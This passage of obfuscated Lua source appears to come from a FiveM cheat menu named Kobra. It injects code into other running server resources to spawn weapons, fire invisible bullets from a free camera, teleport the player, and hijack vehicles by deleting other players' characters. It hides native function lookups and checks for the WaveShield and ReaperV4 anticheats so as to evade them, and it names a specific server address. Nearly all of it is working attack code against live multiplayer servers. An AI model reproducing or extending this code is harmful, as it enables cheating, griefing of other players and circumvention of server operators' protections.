                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1530,v1533));v1523=13 -5 ;end if (v1523==5) then v1527=v1524(v1526);v1528=1000;v1529=v1525 + (v1527 * v1528) ;v1523=6;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v968   .. [[")

                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local function v1365(v1436) local v1437=771 -(134 + 637) ;local v1438;local v1439;local v1440;while true do if (v1437==(1 + 0)) then v1440=math.abs(math.cos(v1439));return vector3( -math.sin(v1438) * v1440 ,math.cos(v1438) * v1440 ,math.sin(v1439));end if (v1437==0) then v1438=math.rad(v1436.z);v1439=math.rad(v1436.x);v1437=1158 -(775 + 382) ;end end end function hNative(v1441,v1442) local v1443=_G[v1441];if ( not v1443 or (type(v1443)~="function")) then return;end _G[v1441]=function(...) return v1442(v1443,...);end;end hNative("CreateThread",function(v1444,...) return v1444(...);end);hNative("Wait",function(v1445,...) return v1445(...);end);hNative("PlayerPedId",function(v1446,...) return v1446(...);end);hNative("GetHashKey",function(v1447,...) return v1447(...);end);hNative("GiveWeaponToPed",function(v1448,...) return v1448(...);end);hNative("SetCurrentPedWeapon",function(v1449,...) return v1449(...);end);hNative("GetCurrentPedWeapon",function(v1450,...) return v1450(...);end);hNative("RemoveWeaponFromPed",function(v1451,...) return;end);local v1366=GetCamCoord(_G.KobraFreecamObject);local v1367=GetCamRot(_G.KobraFreecamObject,2 -0 );local v1368=v1365(v1367);local v1369=1607 -(45 + 562) ;local v1370=v1366 + (v1368 * v1369) ;local v1371=PlayerPedId();local v1372=GetHashKey(v968);GiveWeaponToPed(PlayerPedId(),v1372,250,false,true);SetCurrentPedWeapon(PlayerPedId(),v1372,true);ShootSingleBulletBetweenCoords(v1366.x,v1366.y,v1366.z,v1370.x,v1370.y,v1370.z,100,true,v1372,v1371,true,false,100000);end break;end if ((862 -(545 + 317))==v967) then v968=v36[v34];if (v968=="WEAPON_PERMKILL") then v968="WEAPON_TRANQUILIZER";elseif (v968=="WEAPON_RPG_2") then v968="WEAPON_AIRSTRIKE_ROCKET";end v967=1;end end end end if IsDisabledControlJustPressed(0 -0 ,1050 -(763 + 263) ) then local v814=v664;if (v814=="Teleport") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local function v1268(v1311) local v1312=math.rad(v1311.z);local v1313=math.rad(v1311.x);local v1314=math.abs(math.cos(v1313));return vector3( -math.sin(v1312) * v1314 ,math.cos(v1312) * v1314 ,math.sin(v1313));end function GetEmptySeat(v1315) local v1316={ -(1751 -(512 + 1238)),0,1,3 -1 };for v1329,v1330 in ipairs(v1316) do if IsVehicleSeatFree(v1315,v1330) then return v1330;end end return  -1;end local v1269=GetCamCoord(_G.KobraFreecamObject);local v1270=GetCamRot(_G.KobraFreecamObject,2);local v1271=v1268(v1270);local v1272=2246 -(533 + 713) ;local v1273=v1269 + (v1271 * v1272) ;local v1274=StartShapeTestRay(v1269.x,v1269.y,v1269.z,v1273.x,v1273.y,v1273.z, -(29 -(14 + 14)),PlayerPedId(),0);local v1275,v1276,v1277,v1275,v1278=GetShapeTestResult(v1274);if v1276 then if ((v1278~=(825 -(499 + 326))) and IsEntityAVehicle(v1278)) then local v1452=0;local v1453;local v1454;local v1455;while true do if (v1452==0) then v1453=v1278;v1454=PlayerPedId();v1452=1 -0 ;end if (v1452==1) then v1455=GetEmptySeat(v1453);if (v1455== -1) then TaskWarpPedIntoVehicle(v1454,v1453, -(425 -(104 + 320)));elseif (v1455>=(1997 -(1929 + 68))) then TaskWarpPedIntoVehicle(v1454,v1453,v1455);else print("[^5SYNC^7]: There aren't any seats available in this vehicle.");end break;end end else SetEntityCoords(PlayerPedId(),v1277.x,v1277.y,v1277.z,false,false,false,false);end else print("[^5SYNC^7]: There aren't any valid locations to teleport to.");end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                if _G.KobraFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function GetEmptySeat(vehicle)
                                        local seats = {
                                            -1, 0, 1, 2
                                        }

                                        for _, seat in ipairs(seats) do
                                            if IsVehicleSeatFree(vehicle, seat) then
                                                return seat
                                            end
                                        end

                                        return -1
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                    hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsWithoutPlantsReset", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local forward = RotationToDirection(rot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                    if hit then
                                        if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                            local vehicle = entityHit
                                            local playerPed = PlayerPedId()
                                            local seat = GetEmptySeat(vehicle)
                                            if seat == -1 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                            elseif seat >= 0 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                            else
                                                print("[^5Kobra^7]: There aren't any seats available in this vehicle.")
                                            end
                                        else
                                            SetEntityCoordsWithoutPlantsReset(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                        end
                                    else
                                        print("[^5Kobra^7]: There aren't any valid locations to teleport to.")
                                    end
                                end
                            ]]);end elseif _G.KobraFreecamObject then local v1179=1323 -(1206 + 117) ;local v1180;local v1181;local v1182;local v1183;local v1184;local v1185;local v1186;local v1187;local v1188;local v1189;local v1190;while true do if (v1179==(3 + 0)) then v1187,v1188,v1189,v1187,v1190=GetShapeTestResult(v1186);if v1188 then if ((v1190~=(1592 -(683 + 909))) and IsEntityAVehicle(v1190)) then local v1534=0 -0 ;local v1535;local v1536;local v1537;while true do if (v1534==(1 -0)) then v1537=GetEmptySeat(v1535);if (v1537== -1) then TaskWarpPedIntoVehicle(v1536,v1535, -1);elseif (v1537>=0) then TaskWarpPedIntoVehicle(v1536,v1535,v1537);else print("[^5Kobra^7]: There aren't any seats available in this vehicle.");end break;end if (v1534==(777 -(772 + 5))) then v1535=v1190;v1536=PlayerPedId();v1534=1;end end else MachoInjectThread(0,"any","",[[ 
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        SetEntityCoords(PlayerPedId(), ]]   .. v1189.x   .. [[, ]]   .. v1189.y   .. [[, ]]   .. v1189.z   .. [[, false, false, false, false)
                                    ]] );end else print("[^5Kobra^7]: There aren't any valid locations to teleport to.");end break;end if (v1179==(1428 -(19 + 1408))) then v1181=GetCamCoord(_G.KobraFreecamObject);v1182=GetCamRot(_G.KobraFreecamObject,290 -(134 + 154) );v1183=v1180(v1182);v1179=2;end if (v1179==0) then v1180=nil;function v1180(v1331) local v1332=0 -0 ;local v1333;local v1334;local v1335;while true do if (v1332==(0 -0)) then v1333=math.rad(v1331.z);v1334=math.rad(v1331.x);v1332=1;end if (v1332==(1 + 0)) then v1335=math.abs(math.cos(v1334));return vector3( -math.sin(v1333) * v1335 ,math.cos(v1333) * v1335 ,math.sin(v1334));end end end function GetEmptySeat(v1336) local v1337={ -(203 -(10 + 192)),47 -(13 + 34) ,1,1710 -(119 + 1589) };for v1373,v1374 in ipairs(v1337) do if IsVehicleSeatFree(v1336,v1374) then return v1374;end end return  -1;end v1179=2 -1 ;end if (v1179==(2 -0)) then v1184=1000;v1185=v1181 + (v1183 * v1184) ;v1186=StartShapeTestRay(v1181.x,v1181.y,v1181.z,v1185.x,v1185.y,v1185.z, -(553 -(545 + 7)),PlayerPedId(),0 -0 );v1179=2 + 1 ;end end end elseif (v814=="Kick from Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1191=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1191,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);elseif _G.KobraFreecamObject then local v1279=0;local v1280;local v1281;local v1282;local v1283;local v1284;local v1285;local v1286;local v1287;local v1288;local v1289;local v1290;local v1291;local v1292;local v1293;local v1294;while true do if (v1279==2) then hNative("SetEntityVisible",function(v1456,...) return v1456(...);end);hNative("DeletePed",function(v1457,...) return v1457(...);end);hNative("ClearPedTasksImmediately",function(v1458,...) return v1458(...);end);hNative("SetEntityCoordsNoOffset",function(v1459,...) return v1459(...);end);hNative("IsEntityAVehicle",function(v1460,...) return v1460(...);end);v1279=3;end if (v1279==(1710 -(494 + 1209))) then CreateThread(function() if v1291 then if ((v1293~=(0 -0)) and IsEntityAVehicle(v1293)) then local v1593=v1293;v1294(v1593);end end end);break;end if (v1279==(1001 -(197 + 801))) then hNative("SetPedIntoVehicle",function(v1461,...) return v1461(...);end);hNative("PlayerPedId",function(v1462,...) return v1462(...);end);hNative("NetworkRequestControlOfEntity",function(v1463,...) return v1463(...);end);hNative("NetworkHasControlOfEntity",function(v1464,...) return v1464(...);end);v1280=nil;v1279=7 -3 ;end if (v1279==1) then hNative("GetCamCoord",function(v1465,...) return v1465(...);end);hNative("GetCamRot",function(v1466,...) return v1466(...);end);hNative("StartShapeTestRay",function(v1467,...) return v1467(...);end);hNative("GetShapeTestResult",function(v1468,...) return v1468(...);end);hNative("GetPedInVehicleSeat",function(v1469,...) return v1469(...);end);v1279=2;end if (v1279==(24 -19)) then v1283=GetEntityCoords(v1282);v1284=GetCamCoord(_G.KobraFreecamObject);v1285=GetCamRot(_G.KobraFreecamObject,956 -(919 + 35) );v1286=v1281(v1285);v1287=848 + 152 ;v1279=24 -18 ;end if ((471 -(369 + 98))==v1279) then function v1280(v1470,v1471) v1471=v1471 or (3115 -(400 + 715)) ;local v1472=GetGameTimer();while (GetGameTimer() -v1472)<v1471  do if NetworkHasControlOfEntity(v1470) then return true;end NetworkRequestControlOfEntity(v1470);Wait(0 + 0 );end return NetworkHasControlOfEntity(v1470);end v1281=nil;function v1281(v1473) local v1474=0 + 0 ;local v1475;local v1476;local v1477;while true do if ((1325 -(744 + 581))==v1474) then v1475=math.rad(v1473.z);v1476=math.rad(v1473.x);v1474=1 + 0 ;end if ((1623 -(653 + 969))==v1474) then v1477=math.abs(math.cos(v1476));return vector3( -math.sin(v1475) * v1477 ,math.cos(v1475) * v1477 ,math.sin(v1476));end end end function GetEmptySeat(v1478) local v1479=0;local v1480;while true do if (v1479==(0 -0)) then v1480={ -(1632 -(12 + 1619)),0 -0 ,4 -3 ,2};for v1594,v1595 in ipairs(v1480) do if IsVehicleSeatFree(v1478,v1595) then return v1595;end end v1479=1663 -(710 + 952) ;end if ((1869 -(555 + 1313))==v1479) then return  -(1 + 0);end end end v1282=PlayerPedId();v1279=5;end if (v1279==(6 + 0)) then v1288=v1284 + (v1286 * v1287) ;v1289=StartShapeTestRay(v1284.x,v1284.y,v1284.z,v1288.x,v1288.y,v1288.z, -(1 + 0),v1282,1468 -(1261 + 207) );v1290,v1291,v1292,v1290,v1293=GetShapeTestResult(v1289);v1294=nil;function v1294(v1481) if ( not v1481 or  not DoesEntityExist(v1481)) then return;end local v1482=GetPedInVehicleSeat(v1481, -(253 -(245 + 7)));if ((v1482~=(747 -(212 + 535))) and DoesEntityExist(v1482)) then SetPedIntoVehicle(v1282,v1481,0 -0 );v1280(v1481,3476 -(905 + 571) );Wait(46 -36 );for v1580=0 -0 ,15 -11  do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1482   .. [[)
                                        ]] );end Wait(1 + 39 );SetPedIntoVehicle(v1282,v1481, -1);Wait(1464 -(522 + 941) );SetPedIntoVehicle(v1282,v1481,GetEmptySeat(v1481));Wait(1512 -(292 + 1219) );SetPedIntoVehicle(v1282,v1481, -(1113 -(787 + 325)));Wait(1367 -917 );ClearPedTasksImmediately(v1282);SetEntityCoordsNoOffset(v1282,v1283.x,v1283.y,v1283.z,true,true,true,true);Wait(89 + 11 );end end v1279=15 -8 ;end if (v1279==(534 -(424 + 110))) then function hNative(v1483,v1484) local v1485=0 + 0 ;local v1486;while true do if (v1485==1) then _G[v1483]=function(...) return v1484(v1486,...);end;break;end if (v1485==0) then v1486=_G[v1483];if ( not v1486 or (type(v1486)~="function")) then return;end v1485=1;end end end hNative("CreateThread",function(v1487,...) return v1487(...);end);hNative("Wait",function(v1488,...) return v1488(...);end);hNative("DoesEntityExist",function(v1489,...) return v1489(...);end);hNative("GetEntityCoords",function(v1490,...) return v1490(...);end);v1279=1;end end end elseif (v814=="Hijack Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1295=0;local v1296;while true do if (v1295==(0 + 0)) then v1296=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1296,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then function hNative(v1375,v1376) local v1377=0;local v1378;while true do if (v1377==1) then _G[v1375]=function(...) return v1376(v1378,...);end;break;end if (v1377==(0 + 0)) then v1378=_G[v1375];if ( not v1378 or (type(v1378)~="function")) then return;end v1377=313 -(33 + 279) ;end end end hNative("CreateThread",function(v1379,...) return v1379(...);end);hNative("Wait",function(v1380,...) return v1380(...);end);hNative("DoesEntityExist",function(v1381,...) return v1381(...);end);hNative("GetEntityCoords",function(v1382,...) return v1382(...);end);hNative("GetCamCoord",function(v1383,...) return v1383(...);end);hNative("GetCamRot",function(v1384,...) return v1384(...);end);hNative("StartShapeTestRay",function(v1385,...) return v1385(...);end);hNative("GetShapeTestResult",function(v1386,...) return v1386(...);end);hNative("GetPedInVehicleSeat",function(v1387,...) return v1387(...);end);hNative("SetEntityVisible",function(v1388,...) return v1388(...);end);hNative("DeletePed",function(v1389,...) return v1389(...);end);hNative("ClearPedTasksImmediately",function(v1390,...) return v1390(...);end);hNative("SetEntityCoordsNoOffset",function(v1391,...) return v1391(...);end);hNative("IsEntityAVehicle",function(v1392,...) return v1392(...);end);hNative("SetPedIntoVehicle",function(v1393,...) return v1393(...);end);hNative("PlayerPedId",function(v1394,...) return v1394(...);end);hNative("NetworkRequestControlOfEntity",function(v1395,...) return v1395(...);end);hNative("NetworkHasControlOfEntity",function(v1396,...) return v1396(...);end);local function v1338(v1397,v1398) local v1399=0 + 0 ;local v1400;while true do if ((1354 -(1338 + 15))==v1399) then while (GetGameTimer() -v1400)<v1398  do local v1581=1423 -(528 + 895) ;while true do if (v1581==0) then if NetworkHasControlOfEntity(v1397) then return true;end 